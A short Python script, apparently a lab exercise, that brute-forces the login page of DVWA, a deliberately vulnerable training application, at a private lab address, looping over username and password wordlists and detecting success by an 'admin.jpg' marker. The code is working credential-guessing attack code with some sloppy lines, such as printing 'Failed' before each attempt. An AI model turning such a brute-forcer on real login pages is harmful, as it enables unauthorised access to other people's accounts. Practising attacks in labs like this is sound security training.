import http.client
import urllib.parse
import requests

session = requests.Session()

dvwaSessid_value = "d46f3736a3558a109503b9f4f69df086"

session.cookies.set("DVWASESSID", dvwaSessid_value)

with open("usernames.txt") as username_file, open("pass.txt") as password_file:
  username_list = [line.strip() for line in username_file.readlines()]
  password_list = [line.strip() for line in password_file.readlines()]

url = "http://192.168.50.101/dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login#"

for user in username_list:
  for pwd in password_list:
    params = ({'username': user, 'password': pwd, 'Login': "Login"})
    headers = {"Content-Type": "text/html;charset=utf-8", "Accept": "image/avif,image/webp,*/*"}
    print("Failed:", user, "-", pwd)

    response = session.get(url, params=params, headers=headers)

    if "admin.jpg" in response.text:
      print("Logged in with:", user, "-", pwd)

cookies = session.cookies

session.close()

username_file.close()
password_file.close()